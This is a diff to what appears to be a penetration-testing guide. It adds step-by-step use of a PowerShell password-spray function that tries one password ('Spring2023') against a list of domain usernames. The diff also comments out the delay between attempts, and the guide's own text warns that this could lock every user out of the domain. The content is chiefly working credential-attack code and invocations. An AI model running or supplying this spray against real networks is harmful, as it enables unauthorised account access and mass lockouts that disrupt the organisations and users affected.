@@ -39,6 +39,8 @@ Remove-Item $outfile -ErrorAction Ignore
 ```
 ## Password Spray with PowerShell
 
+First, copy and paste the Invoke-dpsLight function below into your PowerShell window. This will not run the password spray but will make the Invoke-dpsLight function available for us to use.
+
 ```PowerShell
 function Invoke-dpsLight ($Password, $userlist) {
     $users = Get-Content $userlist
@@ -52,11 +54,23 @@ function Invoke-dpsLight ($Password, $userlist) {
         }
         else {
             Write-Host "$count`:$User " -NoNewline
-            start-sleep -milliseconds 300
+            # start-sleep -milliseconds 300
         }
     }
     Write-Host -ForegroundColor green "Finished"
 }
+```
+
+Next, you can execute the follow to run the password spray. Be very careful. You could lock every user in the domain out using this script. Don't run it multiple times in a short period of time. In this example, "Spring2023" is the password guess and **all-ab-users.txt** is the list of usernames to try the password on.
+
+```PowerShell
+Invoke-dpsLight "Spring2023" all-ab-users.txt
+```
+
+Or, if you want to output the results to a file in addition to on the screen you can use the following.
+
+```PowerShell
+Invoke-dpsLight "Spring2023" all-ab-users.txt 2 *>&1 | tee -Append out.txt
 ```
 
 ## Password Spray from the Command Prompt
